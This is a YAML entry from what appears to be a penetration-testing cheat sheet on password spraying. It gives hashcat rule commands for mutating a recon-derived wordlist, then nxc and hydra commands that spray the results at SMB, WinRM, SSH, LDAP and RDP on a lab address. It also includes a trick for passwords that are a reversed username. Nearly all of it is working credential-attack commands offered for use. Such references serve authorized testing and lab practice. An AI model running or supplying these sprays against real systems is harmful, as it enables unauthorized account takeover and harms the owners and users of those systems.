---
description: |
  Generate password lists using Hashcat rules from a base wordlist, then spray against services. Use dive.rule for thorough coverage or best64.rule for speed. Useful for targeted password attacks when you know base words.
command: |
  # Generate Passwords with Rules
  # Generate with dive.rule (comprehensive — millions of candidates):
  hashcat raw.txt --stdout -r /usr/share/hashcat/rules/dive.rule > rawpass.txt

  # Generate with best64.rule (fast, high hit rate):
  hashcat raw.txt --stdout -r /usr/share/hashcat/rules/best64.rule > rawpass.txt

  # Generate with OneRuleToRuleThemAll (community favorite):
  hashcat raw.txt --stdout -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule > rawpass.txt

  # Generate with toggles (case variations):
  hashcat raw.txt --stdout -r /usr/share/hashcat/rules/toggles1.rule > rawpass.txt

  # Chain Multiple Rules
  # Chain rules for more permutations (multiplies output):
  hashcat raw.txt --stdout -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule > rawpass.txt

  # Chain best64 with leetspeak:
  hashcat raw.txt --stdout -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/leetspeak.rule > rawpass.txt

  # Check Output Size Before Spraying
  # Count generated passwords (avoid spraying millions):
  wc -l rawpass.txt
  # dive.rule can produce millions of candidates — too many for spraying
  # best64.rule is more manageable for network spraying
  # OneRuleToRuleThemAll is a good middle ground

  # Remove duplicates to reduce spray time:
  sort -u rawpass.txt -o rawpass.txt

  # Spray Generated Passwords
  # Spray against SMB:
  nxc smb 10.10.10.27 -u sec_user -p rawpass.txt
  nxc smb 10.10.10.27 -u users.txt -p rawpass.txt --continue-on-success

  # Spray against WinRM:
  nxc winrm 10.10.10.27 -u sec_user -p rawpass.txt

  # Spray against SSH:
  nxc ssh 10.10.10.27 -u sec_user -p rawpass.txt

  # Spray against LDAP:
  nxc ldap 10.10.10.27 -u sec_user -p rawpass.txt

  # Spray against RDP:
  nxc rdp 10.10.10.27 -u sec_user -p rawpass.txt

  # Spray with Hydra:
  hydra -l sec_user -P rawpass.txt 10.10.10.27 ssh
  hydra -l sec_user -P rawpass.txt 10.10.10.27 smb

  # Reversed String Passwords
  # Some users set passwords that are their username reversed:
  # Create a reverse rule
  echo 'rev' > /tmp/reverse.rule
  hashcat usernames.txt --stdout -r /tmp/reverse.rule > reversed.txt
  # Or use the rev command directly
  cat usernames.txt | rev > reversed.txt
  # Then spray reversed passwords
  nxc smb 10.10.10.27 -u users.txt -p reversed.txt --no-bruteforce

  # Building a Base Wordlist (raw.txt)
  # Create targeted base words from recon:
  # Include: company name, usernames, city, common words from the target
  # Example raw.txt:
  # senshu
  # password
  # sec_user
  # summer
  # winter
  # company
  # 2024
  # 2025
  # Then generate mutations:
  hashcat raw.txt --stdout -r /usr/share/hashcat/rules/best64.rule > rawpass.txt

  # Common Rule Comparison
  # Rule                       | Output Size | Speed   | Use Case
  # best64.rule                | ~64x input  | Fast    | Quick spray, first try
  # OneRuleToRuleThemAll.rule  | ~50k+ x     | Medium  | Thorough targeted attack
  # dive.rule                  | Millions    | Slow    | Offline cracking only
  # toggles1.rule              | ~15x input  | Fast    | Case variations
  # leetspeak.rule             | ~30x input  | Fast    | l33t substitutions
items:
  - Username
phase:
  - Exploitation
target_os: []
services: []
techniques:
  - Password_Spraying
references:
  - https://hashcat.net/wiki/doku.php?id=rule_based_attack
---
